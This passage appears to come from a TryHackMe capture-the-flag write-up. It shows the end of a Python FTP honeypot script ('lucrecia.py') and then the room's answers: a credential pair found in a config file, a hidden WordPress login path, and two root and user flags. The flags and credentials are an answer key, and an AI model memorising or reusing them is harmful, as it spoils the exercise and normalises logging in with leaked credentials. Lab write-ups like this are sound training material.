+	currentDirectory = sectionFTP["CURRENT_DIRECTORY"]
+	msg = sectionFTP["MSG"]
+	directory = sectionFTP["DIRECTORY_FILES"]
+
+	return (host,port,user,password,currentDirectory,msg,directory)
+
+def main():
+
+	system("clear")
+
+	print(banner())
+	
+	parser = argparse.ArgumentParser(add_help=False)
+
+	parser.formatter_class = RawTextHelpFormatter
+	parser.description = "\033[1;34m<Honeypot FTP - Medium Interaction>\033[0;39m"
+	parser.usage = "lucrecia.py [OPTIONS]"
+	parser.epilog = """
+
+\033[1;31mExample:\033[0;39m lucrecia.py -h 192.168.0.18 -p 21
+         lucrecia.py -h 192.168.0.18 -p 5000 -U lucrecia -P toor
+         lucrecia.py -h 192.168.0.18 -p 5000 -d "/home/lucrecia/ftp"
+         lucrecia.py -h 192.168.0.18 --directory-files "myPictures.zip,overflow.c"
+         lucrecia.py -f server.conf 
+		
+		"""
+
+	sArgs = parser.add_argument_group('\033[1;33mServer Arguments\033[0;39m')
+	sArgs.add_argument('-h', '--host', help='IP server', type=str)
+	sArgs.add_argument('-p', '--port', help='Port server', type=int, default=21)
+	sArgs.add_argument('-d','--directory', help='Set honeypot\'s current directory', type=str, default="/home/lucrecia/Server/", metavar="")
+	sArgs.add_argument('--directory-files', help="Set fake files", dest="dfiles", type=str, default="myPictures.zip", metavar="")
+	sArgs.add_argument('-U','--user', help="Set user", type=str, default="lucrecia")
+	sArgs.add_argument('-P','--password', help="Set password", type=str, default="toor", metavar="")
+	sArgs.add_argument('-m','--message', help="Set welcome message", type=str, default="Welcome to Lucrecia's FTP server (vsFTPd 3.0.3)", metavar="")
+
+	fArgs = parser.add_argument_group('\033[1;33mServer File Arguments\033[0;39m')
+	fArgs.add_argument('-f', '--file', help='File configurations')
+
+	args = parser.parse_args()
+
+	if (args.file != None):
+
+		args.host = None
+		args.port = None
+		args.directory = None
+		args.user = None
+		args.password = None
+		args.message = None
+		args.dfiles = None
+
+		if isfile(args.file):
+			
+			fconf = FileConfiguration(args.file)
+
+			#print(fconf)
+
+			preparate(fconf)
+
+		else:
+
+			print ("\033[1;39m [\033[1;31mx\033[1;39m] File does not exist.\n")
+
+	elif (args.host!=None) and \
+		 (args.port) and \
+		 (args.directory) and \
+		 (args.user) and \
+		 (args.password) and \
+		 (args.directory) and \
+		 (args.message) and \
+		 (args.dfiles):
+
+			conf = (args.host,args.port,args.user,args.password,args.directory,args.message,args.dfiles,)
+
+			preparate(conf)		
+
+		#	print ("\033[1;39m [\033[1;31mx\033[1;39m] Some arguments may be wrong.\n")
+
+	else:
+
+		#print(args)
+
+		#print ("\033[1;39m[\033[1;31mx\033[1;39m] Arguments are missing to start the Honeypot\n")
+
+		parser.print_help(sys.stderr)
+
+	
+	return
+
+if __name__ == '__main__':
+
+	main()
+```
+```text
+# ESPERO QUE DISFRUTEN DE ESTA PEQUEÑA TOOL :)
+```
+What are the credentials you found in the configuration file?
+example: user:password
+port 80
+*Anny:P4$W0RD!!#S3CUr3!*
+What is the login path for the wordpress installation?
+*/?devtools*
+Compromise the machine and locate user.txt
+Escalate privileges and obtain root.txt
+
+## Flags / Answers
+- ***THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}***
+- ***THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}***
+
+## Notes / Lessons Learned
+[[Recovery]]
+
